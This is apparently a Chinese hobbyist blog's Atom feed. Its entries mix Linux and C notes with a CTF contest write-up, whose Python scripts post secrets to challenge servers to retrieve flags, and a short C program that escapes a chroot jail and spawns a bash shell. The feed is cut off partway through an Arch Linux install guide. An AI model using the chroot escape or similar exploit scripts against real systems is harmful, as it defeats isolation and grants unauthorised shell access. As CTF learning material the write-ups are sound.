<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>咲夜南梦&#39;s 博客</title>
  <icon>https://www.gravatar.com/avatar/9c2e3cbf266e9f01ba2f5ba134dc3429</icon>
  <subtitle>技术向-肥宅空间</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-02-25T04:46:49.198Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>咲夜南梦</name>
    <email>196011564@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux-更新Kernel</title>
    <link href="http://yoursite.com/2021/02/25/Linux-%E6%9B%B4%E6%96%B0Kernel/"/>
    <id>http://yoursite.com/2021/02/25/Linux-%E6%9B%B4%E6%96%B0Kernel/</id>
    <published>2021-02-24T16:54:58.666Z</published>
    <updated>2021-02-25T04:46:49.198Z</updated>
    
    <content type="html"><![CDATA[<h3 id="更新kernel">更新kernel</h3><h4 id="Kernel更新包地址-https-kernel-ubuntu-com-kernel-ppa-mainline">Kernel更新包地址:<a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" target="_blank" rel="noopener">https://kernel.ubuntu.com/~kernel-ppa/mainline/</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;kernel.ubuntu.com&#x2F;~kernel-ppa&#x2F;mainline&#x2F;v5.2.4&#x2F;linux-headers-5.2.4-050204_5.2.4-050204.201907280731_all.deb</span><br><span class="line">wget https:&#x2F;&#x2F;kernel.ubuntu.com&#x2F;~kernel-ppa&#x2F;mainline&#x2F;v5.2.4&#x2F;linux-headers-5.2.4-050204-generic_5.2.4-050204.201907280731_amd64.deb</span><br><span class="line">wget https:&#x2F;&#x2F;kernel.ubuntu.com&#x2F;~kernel-ppa&#x2F;mainline&#x2F;v5.2.4&#x2F;linux-image-unsigned-5.2.4-050204-generic_5.2.4-050204.201907280731_amd64.deb</span><br><span class="line">wget https:&#x2F;&#x2F;kernel.ubuntu.com&#x2F;~kernel-ppa&#x2F;mainline&#x2F;v5.2.4&#x2F;linux-modules-5.2.4-050204-generic_5.2.4-050204.201907280731_amd64.deb</span><br></pre></td></tr></table></figure><h4 id="开始安装">开始安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i *.deb</span><br></pre></td></tr></table></figure><h4 id="出现问题-libssl1-1包不存在">出现问题 <code>libssl1.1包</code>不存在</h4><h4 id="解决：">解决：</h4><h4 id="需要安装包-libssl1-1-直接使用命令会安装失败，需要更添加源，这个包的更新数据ubuntu官方认可的源才能更新。">需要安装包 libssl1.1, 直接使用命令会安装失败，需要更添加源，这个包的更新数据ubuntu官方认可的源才能更新。</h4><h4 id="到该网址去查看https-packages-ubuntu-com-bionic-libssl1-1">到该网址去查看https://packages.ubuntu.com/bionic/libssl1.1</h4><h4 id="选择跟自己系统对应的，进行安装就好了">选择跟自己系统对应的，进行安装就好了</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;更新kernel&quot;&gt;更新kernel&lt;/h3&gt;
&lt;h4 id=&quot;Kernel更新包地址-https-kernel-ubuntu-com-kernel-ppa-mainline&quot;&gt;Kernel更新包地址:&lt;a href=&quot;https://kernel.ubuntu.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>常见链接</title>
    <link href="http://yoursite.com/2021/02/22/%E5%B8%B8%E8%A7%81%E9%93%BE%E6%8E%A5/"/>
    <id>http://yoursite.com/2021/02/22/%E5%B8%B8%E8%A7%81%E9%93%BE%E6%8E%A5/</id>
    <published>2021-02-22T03:59:36.293Z</published>
    <updated>2021-02-22T03:59:36.293Z</updated>
    
    <content type="html"><![CDATA[<p>常见链接<br>Linux源码:<a href="https://elixir.bootlin.com/linux/v5.5-rc2/source" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.5-rc2/source</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;常见链接&lt;br&gt;
Linux源码:&lt;a href=&quot;https://elixir.bootlin.com/linux/v5.5-rc2/source&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://elixir.bootlin.com/lin
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Manim学习笔记</title>
    <link href="http://yoursite.com/2021/02/09/Manim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2021/02/09/Manim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-02-09T01:12:07.939Z</published>
    <updated>2021-02-09T01:12:07.939Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Manim学习笔记">Manim学习笔记</h2><h3 id="由妈咪叔维护的latex平台">由妈咪叔维护的latex平台</h3><h4 id="https-www-latexlive-com"><a href="https://www.latexlive.com/##" target="_blank" rel="noopener">https://www.latexlive.com/##</a></h4><h3 id="绘画一个实心圆">绘画一个实心圆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from manimlib.imports import *</span><br><span class="line">class transform(Scene):</span><br><span class="line">    def construct(self):</span><br><span class="line">        circle &#x3D; Circle()</span><br><span class="line">        self.play(ShowCreation(circle))</span><br><span class="line">        pi &#x3D; Tex(r&quot;\pi&quot;)</span><br><span class="line">        pi.shift(LEFT)</span><br><span class="line">        self.add(pi)</span><br><span class="line">        #self.play(pi.shift,LEFT)</span><br><span class="line">        self.wait()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Manim学习笔记&quot;&gt;Manim学习笔记&lt;/h2&gt;
&lt;h3 id=&quot;由妈咪叔维护的latex平台&quot;&gt;由妈咪叔维护的latex平台&lt;/h3&gt;
&lt;h4 id=&quot;https-www-latexlive-com&quot;&gt;&lt;a href=&quot;https://www.latexliv
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>C语言-常用函数整理</title>
    <link href="http://yoursite.com/2021/01/18/C-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2021/01/18/C-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/</id>
    <published>2021-01-18T04:56:02.000Z</published>
    <updated>2021-01-18T05:00:19.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件操作">文件操作</h2><h3 id="size-t-read-int-fd-char-buf-size-t-size"><code>size_t read(int fd ,char * buf ,size_t size);</code></h3><hr><h3 id="头文件">头文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br></pre></td></tr></table></figure><h3 id="off-t-lseek-int-fildes-off-t-offset-int-whence"><code>off_t lseek(int fildes,off_t offset ,int whence);</code></h3><hr><h4 id="头文件-2">头文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br></pre></td></tr></table></figure><h4 id="whence参数如下"><code>whence</code>参数如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">whence为下列其中一种:（SEEK_SET,SEEK_CUR和SEEK_END和依次为0，1和2）.</span><br><span class="line">SEEK_SET 将读写位置指向文件头后再增加offset个位移量。</span><br><span class="line">SEEK_CUR 以目前的读写位置往后增加offset个位移量。</span><br><span class="line">SEEK_END 将读写位置指向文件尾后再增加offset个位移量。</span><br><span class="line">当whence 值为SEEK_CUR 或SEEK_END时，参数offet允许负值的出现。</span><br><span class="line">下列是较特别的使用方式:</span><br><span class="line">1) 欲将读写位置移到文件开头时:</span><br><span class="line">lseek(int fildes,0,SEEK_SET)</span><br><span class="line">2) 欲将读写位置移到文件尾时:</span><br><span class="line">lseek(int fildes，0,SEEK_END)</span><br><span class="line">3) 想要取得目前文件位置时:</span><br><span class="line">lseek(int fildes，0,SEEK_CUR)</span><br></pre></td></tr></table></figure><h4 id="参考资料-https-blog-csdn-net-fervor-heart-article-details-8978907">参考资料 <code>https://blog.csdn.net/fervor_heart/article/details/8978907</code></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文件操作&quot;&gt;文件操作&lt;/h2&gt;
&lt;h3 id=&quot;size-t-read-int-fd-char-buf-size-t-size&quot;&gt;&lt;code&gt;size_t read(int fd ,char * buf ,size_t size);&lt;/code&gt;&lt;/h3&gt;
&lt;hr
      
    
    </summary>
    
    
      <category term="C语言" scheme="http://yoursite.com/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="C语言" scheme="http://yoursite.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CTF-2020年极客大挑战</title>
    <link href="http://yoursite.com/2020/10/22/CTF-2020%E5%B9%B4%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>http://yoursite.com/2020/10/22/CTF-2020%E5%B9%B4%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
    <published>2020-10-22T06:00:02.000Z</published>
    <updated>2020-10-22T01:26:16.241Z</updated>
    
    <content type="html"><![CDATA[<h1>Web</h1><h2 id="EZwww">EZwww</h2><hr><h3 id="根据hint，发现源码泄露">根据hint，发现源码泄露</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.100.46.169:3901&#x2F;www.zip</span><br></pre></td></tr></table></figure><h3 id="解压之后代码如下">解压之后代码如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Lola&#39;s website1.0&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;?php echo &#39;&lt;h1&gt;welcome to my website&lt;&#x2F;h1&gt;&#39;; ?&gt;</span><br><span class="line"> &lt;?php echo &#39;&lt;p&gt;i will never forget to backup my website......&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br><span class="line"> &lt;?php echo &#39;&lt;img src&#x3D;&quot;img&#x2F;lola.gif&quot; alt&#x3D;&quot;welcome~&quot;&#x2F;&gt;&#39;; ?&gt;</span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$key1 &#x3D; $_POST[&#39;a&#39;];</span><br><span class="line">$key2 &#x3D; base64_decode(&#39;c3ljbDB2ZXI&#x3D;&#39;);</span><br><span class="line">if($key1 &#x3D;&#x3D;&#x3D; $key2)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;this is a true flag</span><br><span class="line">echo &#39;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="发现只要以POST的形式a-base64-decode-c3ljbDB2ZXI-成立，即可输出flag">发现只要以<code>POST</code>的形式<code>a=base64_decode('c3ljbDB2ZXI=')</code>成立，即可输出flag</h3><h3 id="Exploit如下">Exploit如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">secret &#x3D; &#39;c3ljbDB2ZXI&#x3D;&#39;</span><br><span class="line">ip &#x3D; &#39;47.100.46.169:3901&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;%s&#x2F;index.php&#39; % (ip)</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">&#39;a&#39; : base64.b64decode(secret)</span><br><span class="line">&#125;</span><br><span class="line">print(&quot;POST %s\t%s&quot; % (url,str(data)))</span><br><span class="line">response &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h3 id="回显">回显</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Lola&#39;s website1.0&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;br&gt;&lt;h1&gt;This website has been backed up&lt;&#x2F;h1&gt;&lt;br&gt; dont forget to post something important to get what you want ~QAQ~ &lt;br&gt;&lt;br&gt;&lt;img src&#x3D;&quot;img&#x2F;lola.gif&quot; alt&#x3D;&quot;welcome~&quot;&#x2F;&gt; &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;p&gt;SYC&#123;Backup_1s_4_good_h4bit_l0l&#125;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h3 id="SYC-Backup-1s-4-good-h4bit-l0l">SYC{Backup_1s_4_good_h4bit_l0l}</h3><h2 id="刘壮的黑页">刘壮的黑页</h2><hr><h3 id="一打开页面，全黑的，👴傻了">一打开页面，全黑的，👴傻了</h3><h3 id="立即修改背景，给它洗白白">立即修改背景，给它洗白白</h3><p>!(2.png)[2.png]</p><h3 id="在底部发现php代码">在底部发现php代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">$passwd &#x3D; $_POST[&#39;passwd&#39;];</span><br><span class="line">if ($username &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; $passwd &#x3D;&#x3D;&#x3D; &#39;syclover&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在post发包时带着GET的参数即可">在post发包时带着GET的参数即可</h3><h3 id="Exploit如下-2">Exploit如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">ip &#x3D; &#39;106.54.75.217:8080&#39;</span><br><span class="line">username &#x3D; &#39;admin&#39;</span><br><span class="line">password &#x3D; &#39;syclover&#39;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;%s&#x2F;?username&#x3D;%s&quot; % (ip,username)</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">&#39;passwd&#39;: password</span><br><span class="line">&#125;</span><br><span class="line">response &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h2 id="Welcome">Welcome</h2><hr><h3 id="通过测试发现GET请求被ban了">通过测试发现GET请求被ban了</h3><h3 id="尝试通过POST请求，发现可以得到页面源码，如下">尝试通过POST请求，发现可以得到页面源码，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D;&#x3D; &#39;POST&#39;) &#123;</span><br><span class="line">header(&quot;HTTP&#x2F;1.1 405 Method Not Allowed&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    </span><br><span class="line">    if (!isset($_POST[&#39;roam1&#39;]) || !isset($_POST[&#39;roam2&#39;]))&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ($_POST[&#39;roam1&#39;] !&#x3D;&#x3D; $_POST[&#39;roam2&#39;] &amp;&amp; sha1($_POST[&#39;roam1&#39;]) &#x3D;&#x3D;&#x3D; sha1($_POST[&#39;roam2&#39;]))&#123;</span><br><span class="line">        phpinfo();  &#x2F;&#x2F; collect information from phpinfo!</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Web&lt;/h1&gt;
&lt;h2 id=&quot;EZwww&quot;&gt;EZwww&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&quot;根据hint，发现源码泄露&quot;&gt;根据hint，发现源码泄露&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Re" scheme="http://yoursite.com/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="http://yoursite.com/2020/10/20/test/"/>
    <id>http://yoursite.com/2020/10/20/test/</id>
    <published>2020-10-20T10:46:26.056Z</published>
    <updated>2020-10-22T00:45:55.261Z</updated>
    
    <content type="html"><![CDATA[<p>用例图<br>类图<br>对象图<br>活动图<br>顺序图<br>协作图<br>状态图<br>构件图<br>实施图</p><p>用例图<br>用例<br>描述系统的一个功能<br>参与者<br>用例的使用者在用例交互时所扮演的角色，可以是人、硬件设备或一个系统</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;用例图&lt;br&gt;
类图&lt;br&gt;
对象图&lt;br&gt;
活动图&lt;br&gt;
顺序图&lt;br&gt;
协作图&lt;br&gt;
状态图&lt;br&gt;
构件图&lt;br&gt;
实施图&lt;/p&gt;
&lt;p&gt;用例图&lt;br&gt;
用例&lt;br&gt;
描述系统的一个功能&lt;br&gt;
参与者&lt;br&gt;
用例的使用者在用例交互时所扮演的角色，可以是人、硬件
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WCTF2019-QEMU逃逸-VirtualHole</title>
    <link href="http://yoursite.com/2020/10/05/WCTF2019-QEMU%E9%80%83%E9%80%B8-VirtualHole/"/>
    <id>http://yoursite.com/2020/10/05/WCTF2019-QEMU%E9%80%83%E9%80%B8-VirtualHole/</id>
    <published>2020-10-05T15:25:02.000Z</published>
    <updated>2020-10-29T11:41:24.372Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="0a33cd19b003290b9ee01ee0d2cf392971bf8a59e93d08e860c9c6d665f37b3e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MacOS-进入Docker终端</title>
    <link href="http://yoursite.com/2020/09/06/MacOS-%E8%BF%9B%E5%85%A5Docker%E7%BB%88%E7%AB%AF/"/>
    <id>http://yoursite.com/2020/09/06/MacOS-%E8%BF%9B%E5%85%A5Docker%E7%BB%88%E7%AB%AF/</id>
    <published>2020-09-06T07:33:51.069Z</published>
    <updated>2020-09-06T07:33:52.426Z</updated>
    
    <content type="html"><![CDATA[<p>screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CTF-PHP_Pwn讲解</title>
    <link href="http://yoursite.com/2020/08/28/CTF-PHP_Pwn%E8%AE%B2%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/08/28/CTF-PHP_Pwn%E8%AE%B2%E8%A7%A3/</id>
    <published>2020-08-28T09:32:56.633Z</published>
    <updated>2020-08-28T09:32:57.429Z</updated>
    
    <content type="html"><![CDATA[<p>php -S 0.0.0.0:80 -t /home -d <a href="http://extension=web1.so" target="_blank" rel="noopener">extension=web1.so</a> -a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;php -S 0.0.0.0:80 -t /home -d &lt;a href=&quot;http://extension=web1.so&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;extension=web1.so&lt;/a&gt; -a&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>研究-Chroot逃逸</title>
    <link href="http://yoursite.com/2020/08/20/%E7%A0%94%E7%A9%B6-Chroot%E9%80%83%E9%80%B8/"/>
    <id>http://yoursite.com/2020/08/20/%E7%A0%94%E7%A9%B6-Chroot%E9%80%83%E9%80%B8/</id>
    <published>2020-08-19T16:37:51.275Z</published>
    <updated>2020-08-20T00:53:23.067Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Chroot逃逸">Chroot逃逸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">int fd &#x3D; open(&quot;&#x2F;.&quot;,0);</span><br><span class="line">if(fd &lt; 0)&#123;</span><br><span class="line">puts(&quot;Open Fail!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">chroot(&quot;&#x2F;home&#x2F;ctf&#x2F;chroot_jailbreak&quot;);</span><br><span class="line">chdir(&quot;&#x2F;&quot;);</span><br><span class="line"></span><br><span class="line">fchdir(fd);</span><br><span class="line">chroot(&quot;.&quot;);</span><br><span class="line">system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Chroot逃逸&quot;&gt;Chroot逃逸&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>C-获取键盘宽度</title>
    <link href="http://yoursite.com/2020/08/09/C-%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E5%AE%BD%E5%BA%A6/"/>
    <id>http://yoursite.com/2020/08/09/C-%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E5%AE%BD%E5%BA%A6/</id>
    <published>2020-08-09T13:11:22.282Z</published>
    <updated>2020-08-09T13:11:48.226Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-获取键盘宽度">C-获取键盘宽度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ioctl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main (int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    struct winsize w;</span><br><span class="line">    ioctl(STDOUT_FILENO, TIOCGWINSZ, &amp;w);</span><br><span class="line"></span><br><span class="line">    printf (&quot;lines %d\n&quot;, w.ws_row);</span><br><span class="line">    printf (&quot;columns %d\n&quot;, w.ws_col);</span><br><span class="line">    return 0;  &#x2F;&#x2F; make sure your main returns int</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-获取键盘宽度&quot;&gt;C-获取键盘宽度&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Linux-ArchLinux安装全过程</title>
    <link href="http://yoursite.com/2020/08/07/Linux-ArchLinux%E5%AE%89%E8%A3%85%E5%85%A8%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/08/07/Linux-ArchLinux%E5%AE%89%E8%A3%85%E5%85%A8%E8%BF%87%E7%A8%8B/</id>
    <published>2020-08-07T04:43:58.554Z</published>
    <updated>2021-03-10T08:13:21.114Z</updated>
    
    <content type="html"><![CDATA[<p>arch linux安装全过程</p><h3 id="1、设置时区">1、设置时区</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-timezones Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><h3 id="2、分区">2、分区</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cfdisk</span><br></pre></td></tr></table></figure><h4 id="分区如下">分区如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">200M EFI System</span><br><span class="line">95G Linux filesystem</span><br><span class="line">4.8G Linux swap</span><br></pre></td></tr></table></figure><h3 id="3、格式化分区">3、格式化分区</h3><figure class="highlight 